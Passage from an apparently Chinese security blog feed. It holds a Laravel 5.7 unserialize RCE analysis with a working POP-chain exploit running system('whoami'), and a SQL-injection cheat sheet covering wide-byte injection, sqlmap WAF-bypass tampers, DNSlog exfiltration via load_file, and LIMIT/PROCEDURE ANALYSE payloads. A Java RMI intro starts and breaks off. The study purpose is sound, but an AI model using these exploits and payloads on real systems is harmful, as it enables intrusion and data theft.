class="string">'Test\TestController@Test'</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<ul>
<li>控制器中<code>Test</code>函数实现反序列化功能：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        unserialize($code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Laravel5.7版本在<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing</code>文件夹下增加了一个<code>PendingCommand</code>类，官方的解释该类主要功能是用作命令执行，并且获取输出内容。<br>该类中几个重要属性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> $test;           <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line"><span class="keyword">protected</span> $app;         <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line"><span class="keyword">protected</span> $command;     <span class="comment">//要执行的php函数 system</span></span><br><span class="line"><span class="keyword">protected</span> $parameters;  <span class="comment">//要执行的php函数的参数  array('id')</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用于命令执行的函数为<code>PendingCommand.php</code>中的<code>run()</code>函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span> . $e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion() . <span class="string">'" was asked.'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> $e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;expectedExitCode,</span><br><span class="line">                $exitCode,</span><br><span class="line">                <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $exitCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><code>run()</code>函数被析构函数<code>__destruct()</code>调用<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the object's destruction.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
简单的POP链为：构造的exp经过反序列化后调用<code>__destruct()</code>，进而调用<code>run()</code>,<code>run()</code>进行代码执行。下面进行详细的分析</li>
<li>首先将构造好的序列化数据通过参数C传入，调用<code>__destruct()</code>，<code>__destruct()</code>方法中首先判断<code>$hasExecuted</code>，如果为<code>true</code>则return，可以看到该变量默认值为<code>false</code>，所以可以顺利进入<code>run()</code>方法`<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if command has executed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $hasExecuted = <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure></li>
<li>观察run()方法内的代码，我们要让代码顺利执行到<code>run()</code>处才能顺利执行代码。首先进入<code>mockConsoleOutput()</code>方法</li>
</ul>
<p><img src="run.png" alt="run"></p>
<ul>
<li>171行使用<code>Mockery::mock</code>实现对象模拟，经过调试可以顺利运行，接下来进入<code>mockConsoleOutput()</code>函数</li>
</ul>
<p><img src="mockConsoleOutput.png" alt="mockConsoleOutput"></p>
<ul>
<li>接下来又是<code>Mockery::mock</code>实现对象模拟，经过调试代码可以顺利运行到<code>foreach</code>，<code>foreach</code>循环里的代码是<code>$this-&gt;test-&gt;expectedOutput</code>，这里对<code>$this-&gt;test</code>类的<code>expectedOutput</code>属性<br>进行遍历作为数组，代码才能正常执行下去。但是该类并不存在<code>expectedOutput</code>属性；经过分析代码，我们发现这里只要能够返回一个数组代码就可以顺利进行下去。</li>
</ul>
<p><img src="createABufferedOutputMock.png" alt="createABufferedOutputMock"></p>
<ul>
<li>因此我们全文搜索<code>__get()</code>方法，让<code>__get()</code>方法返回我们想要的数组就可以了。这里我选择的是<code>DefaultGenerator.php</code>类</li>
</ul>
<p><img src="get.png" alt="get"></p>
<ul>
<li>我们对<code>DefaultGenerator</code>类进行实例化并传入数组<code>array(&#39;hello&#39;=&gt;&#39;world&#39;)</code>，打断点进行调试可以看到代码顺利执行下去了</li>
</ul>
<p><img src="get1.png" alt="get1"><br><img src="get2.png" alt="get2"></p>
<ul>
<li>后面的代码都是可以顺利执行下去的，接下来我们又回到了<code>mockConsoleOutput()</code>方法内，接下来又是一个<code>forearch</code>循环，如上一步的遍历数组一样，顺利执行下去</li>
</ul>
<p><img src="get3.png" alt="get3"></p>
<ul>
<li><p>接下来代码会执行到<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>，其中<code>Kernel::class</code>为固定值：<code>&quot;Illuminate\Contracts\Console\Kernel&quot;</code>，在该处下断点进行调试分析下面的调用栈</p>
<blockquote>
<p>→ offsetGet(),$key=”Illuminate\Contracts\Console\Kernel”<br><img src="offsetGet.png" alt="offsetGet"><br>→ make(),$abstract=”Illuminate\Contracts\Console\Kernel”<br><img src="make.png" alt="make"><br>→ make():父类的<code>make()</code>,$abstract=”Illuminate\Contracts\Console\Kernel”,$parameters=array(0)<br><img src="make1.png" alt="make1"></p>
</blockquote>
</li>
<li><p>其中<code>return $this-&gt;instances[$abstract];</code>=<code>$this-&gt;instances[&quot;Illuminate\Contracts\Console\Kernel&quot;]</code>也就是返回了<code>Illuminate\Foundation\Application</code>对象；即我们可以将任意对象赋值给 $this-&gt;instances[$abstract] ，这个对象最终会赋值给<code>[Kernel::class]</code> ，接着调用<code>call()</code>方法</p>
<blockquote>
<p>→ resolve(),$abstract=”Illuminate\Contracts\Console\Kernel”，instances数组中为Application对象<br><img src="resolve.png" alt="resolve"></p>
</blockquote>
</li>
<li><p>下面我们成功的执行到了<code>call()</code>方法，</p>
<blockquote>
<p>→call()<br><img src="call.png" alt="call"></p>
</blockquote>
</li>
<li><p>其中<code>isCallableWithAtSign()</code>方法是判断确定给定的字符串是否使用<code>Class@method</code>语法，不满足自然跳出，执行到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">static</span>::callBoundMethod($container, $callback, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">                $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">            );</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>→BoundMethod::call()<br><img src="call1.png" alt="call1"></p>
</blockquote>
</li>
<li><p>我们来分析一下<code>callBoundMethod()</code>函数，可以发现它的作用只是判断<code>$callback</code>是否为数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">callBoundMethod</span><span class="params">($container, $callback, $default)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_array($callback)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default <span class="keyword">instanceof</span> Closure ? $default() : $default;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>继续跟进下面的匿名函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">                $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>$callback</code>参数是我们可控的，第二个参数由函数<code>getMethodDependencies()</code>控制，我们跟进看一下<br><img src="call2.png" alt="call2"></p>
</li>
<li><p>经过调试，得出结论：它将我们传入的<code>$parameters</code>数组和$<code>dependencies</code>数组合并，其中<code>$dependencies</code>数组为空，而<code>$parameters</code>数组是我们可控的。最终也就是执行了<code>call_user_func_array(&#39;xxx&#39;,array(&#39;xxx&#39;))</code></p>
</li>
</ul>
<h1 id="本地环境复现"><a href="#本地环境复现" class="headerlink" title="本地环境复现"></a>本地环境复现</h1><p>exp文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;                 <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;                   <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;           <span class="comment">//要执行的php函数 system</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;     <span class="comment">//要执行的php函数的参数  array('id')</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instances = [])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">'Illuminate\Contracts\Console\Kernel'</span>] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("<span class="title">hello</span>" =&gt; "<span class="title">world</span>"));</span><br><span class="line"></span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line"></span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line"></span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'whoami'</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>最后贴上利用截图<br><img src="exp.png" alt="exp"></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>这个反序列化RCE重要的点：<ul>
<li>在进入run()函数，运行到call()前，需要bypass<code>mockConsoleOutput()</code>和<code>mockConsoleOutput()</code>，由于某个属性的不存在，我们需要魔法函数<code>__get()</code>返回数组来顺利运行下文的代码</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Laravel5.7</tag>
      </tags>
  </entry>
  <entry>
    <title>关于sql注入</title>
    <url>/2019/11/25/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>宽字节注入，bypass，dnslog注入，limit注入</p>
<a id="more"></a>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入是由于转编码而形成的，那具有转编码功能的函数也成了漏洞的成因。</p>
<h2 id="UTF8"><a href="#UTF8" class="headerlink" title="UTF8"></a>UTF8</h2><p>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF（Universal Transformation Format）。</p>
<h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象。</p>
<blockquote>
<p>GB2312是被GBK兼容的，它的高位范围是0xA1<del>0xF7，低位范围是0xA1</del>0xFE（0x5C不在该范围内），因此不能使用编码吃掉%5c。<br>其它的宽字符集也是一样的分析过程，要吃掉%5c，只需要低位中包含正常的0x5c就行了。</p>
</blockquote>
<ul>
<li><strong>宽字节注入与HTML页面编码是无关的</strong><br>宽字节对转义字符的影响发生在<code>character_set_client=gbk</code>的情况，也就是说，如果<strong>客户端发送的数据字符集是<code>gbk</code></strong>，则可能会吃掉转义字符<code>\</code>，从而导致转义失败。</li>
<li>使用了<code>addslashes</code>函数<br>GBK编码，它的编码范围是0x8140~0xFEFE（不包括<code>0xxx7F</code>），在遇到<code>%df:(ascii(223)) &gt;ascii(128)</code>时自动拼接%5c，因此吃掉‘\’，而%27、%20小于ascii(128)的字符就保留了。<br><code>%df%27</code>，会把它看成一个汉字，但是%27会闭合前面的单引号</li>
</ul>
<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="HPP："><a href="#HPP：" class="headerlink" title="HPP："></a>HPP：</h2><p>HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。假设提交的参数即为：<br><code>id=1&amp;id=2&amp;id=3</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解析结果</span><br><span class="line">Asp.net + iis：id=1,2,3</span><br><span class="line">Asp + iis：id=1,2,3</span><br><span class="line">Php + apache：id=3</span><br></pre></td></tr></table></figure>
<h2 id="sqlmap的各种bypass-waf-tamper："><a href="#sqlmap的各种bypass-waf-tamper：" class="headerlink" title="sqlmap的各种bypass waf tamper："></a>sqlmap的各种bypass waf tamper：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“=”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用“/**/”替换空格符</span><br><span class="line">space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号“+”替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br></pre></td></tr></table></figure>
<h2 id="mysql用户自定义变量"><a href="#mysql用户自定义变量" class="headerlink" title="mysql用户自定义变量"></a>mysql用户自定义变量</h2><ul>
<li>可以先在用户变量中保存值然后在以后引用它；这样可以将值从一个语句传递到另一个语句。用户变量与连接有关。也就是说，一个客户端定义的变量不能被其它客户端看到或使用。当客户端退出时，该客户端连接的所有变量将自动释放。</li>
<li>用户变量的形式为@var_name，其中变量名var_name可以由当前字符集的文字数字字符、‘.’、‘_’和‘$’组成。 默认字符集是cp1252 (Latin1)。可以用mysqld的<code>--default-character-set</code>选项更改字符集。用户变量名对大小写不敏感。</li>
</ul>
<p><strong>设置用户变量的一个途径是执行SET语句</strong><br><code>SET @var_name = expr [, @var_name = expr] ...</code></p>
<ul>
<li>对于SET，可以使用<code>=</code>或<code>:=</code>作为分配符。分配给每个变量的expr可以为整数、实数、字符串或者NULL值。</li>
<li>也可以用语句代替SET来为用户变量分配一个值。在这种情况下，分配符必须为<code>:=</code>而不能用<code>=</code>，因为在非SET语句中<code>=</code>被视为一个比较 操作符：<h2 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h2>过滤单引号<br>  username 输入<code>1\</code><br>  password 输入<code>or 1=1;#</code><br>sql:<code>select * form user_table where username = &#39;1\&#39; and password = &#39;or 1=1;#&#39;</code><br>username中输入的\转义了它后面的单引号，所以此时<code>username =&#39;1\ and password = &#39;</code>，后面的<code>or 1=1;</code>就生效了<h2 id="sql语句中空格的代替方法"><a href="#sql语句中空格的代替方法" class="headerlink" title="sql语句中空格的代替方法"></a>sql语句中空格的代替方法</h2></li>
<li>过滤空格<br>url编码为：<code>%20</code>，双写为<code>%2%200</code><br>也可写作<code>%a0</code><br>常见的绕过空格的就是多行注释<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*!50540select user()*/             mysql(独有)内联注释,!后面的数字是版本号，表示当数据库版本&gt;=5.5.40时执行SQL语句(版本号五位)</span><br><span class="line">/**/                                mysql多行注释</span><br><span class="line">%09,%0a,%0b,%0c,%0d,%20,%a0         一些空白字符</span><br><span class="line">1.1、2.3、1.                        浮点数形式</span><br><span class="line">0e1、1e7                            科学计数法</span><br><span class="line">+、-、!、@、~、&#123;&#125;、&quot;、&apos;、()、``      一些特殊字符</span><br></pre></td></tr></table></figure>
<h1 id="SQL注入之基于DNS的注入-DNSlog注入"><a href="#SQL注入之基于DNS的注入-DNSlog注入" class="headerlink" title="SQL注入之基于DNS的注入(DNSlog注入)"></a>SQL注入之基于DNS的注入(DNSlog注入)</h1>测试一些网站的时候，一些注入都是无回显的，我们可以写脚本来进行盲注，但有些网站会ban掉我们的ip，这样我们可以通过设置ip代理池解决，但是盲注往往效率很低，所以产生了DNSlog注入。</li>
<li>dns在递归查询时，会在dns服务器上保存log，所有经过dns服务器以及其子域名的查询都会在上面留下记录</li>
<li>load_file()不仅可以读取本地文件，也可以对<code>\\example.com</code>这样的url发起请求</li>
</ul>
<ol>
<li>show variables like ‘%secure%’查看load_file()可以读取的磁盘。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_file_priv为空，就可以读取磁盘的目录。</span><br><span class="line"></span><br><span class="line">secure_file_priv为D:\wamp\tmp，就可以读取G盘下wamp\tmp的文件。</span><br><span class="line"></span><br><span class="line">secure_file_priv为null，load_file就不能加载文件。</span><br></pre></td></tr></table></figure></li>
<li>通过更改mysql配置文件<code>my.ini</code>,设置secure_file_priv=””就是可以load_flie任意磁盘的文件。</li>
</ol>
<ul>
<li>我们可以使用dnslog平台或者自己搭建dns服务器，假设dnslog平台给你分配了一个三级级域名：<code>abc.dns.com</code>，如果查询三级域名<code>xxx.abc.dns.com</code>，就会在dns服务器中留下记录,我们可以将payload写在第四级域名的位置</li>
<li>在mysql中执行<code>select load_file(concat(&#39;\\\\&#39;,[payload],&#39;.abc.dns.com\\\aaa&#39;));</code>(‘&#39;会被转义，所以需要+上一个’&#39;)，payload的执行结果会被显示在第四级域名的位置，使用concat函数将(select database())得到的内容作为查询url的一部分，和我们的平台三级域名拼接组合成一个四级域名，而load_file函数会通过dns解析请求，所以我们在dnslog平台就可以看到查询的记录(包含着我们注入出的数据)</li>
<li>对于表段，由于load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析。<h1 id="Limit-注入"><a href="#Limit-注入" class="headerlink" title="Limit 注入"></a>Limit 注入</h1></li>
</ul>
<p>此方法适用于<code>5.0.0&lt;mysql&lt;5.6.6</code>中<br>select语句：<code>select id from t1 where num=123333 order by id limit 1,1</code><br>在select语法中，limit后面可以跟两个函数<code>PROCEDURE</code> 和 <code>INTO</code>，<code>INTO</code>除非有写入shell的权限，否则是无法利用的<br>使用procedure analyse进行报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.41-0ubuntu0.14.04.1&apos;</span><br></pre></td></tr></table></figure>
<p>基于时间：<br><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
  </entry>
  <entry>
    <title>Java RMI学习</title>
    <url>/2020/06/27/Java%20RMI%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是一个学习Java反序列化漏洞的一个入门文章，总结学习Java RMI调用以及一个Spring JNDI注入与反序列化漏洞原理</p>
<a id="more"></a>

<h1 id="Java-RMI的定义"><a href="#Java-RMI的定义" class="headerlink" title="Java RMI的定义"></a>Java RMI的定义</h1><p>Java远程方法调用，即Java RMI (Java Remote Method Invocation)，是Java编程语言里，一种用于<strong>实现远程过程调用的应用程序编程接口</strong>。它使客户机上运行的程序可以直接调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。</p>
<p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p>
<p>在RMI中<strong>对象是通过序列化方式进行编码传输的</strong>。（基于序列化和反序列化就可能存在反序列化漏洞了）<br><strong>RMI的基础是接口，RMI构架基于一个重要的原理：定义接口和<em>定义接口的具体</em>实现是分开的。</strong></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>RMI能让一个Java程序去调用网络中另一台计算机的Java对象的方法，那么调用的效果就像是在本机上调用一样。通俗的讲：A机器上面有一个class，通过远程调用，B机器调用这个class 中的方法。</p>
<h2 id="RMI包含部分："><a href="#RMI包含部分：" class="headerlink" title="RMI包含部分："></a>RMI包含部分：</h2><ol>
<li>远程服务的接口定义</li>
<li>远程服务接口的具体实现</li>
<li>存根（Stub）和骨架（Skeleton）文件</li>
<li>一个运行远程服务的服务器</li>
<li>一个RMI命名服务，它允许客户端去发现这个远程服务</li>
<li>类文件的提供者（一个HTTP或者FTP服务器）</li>
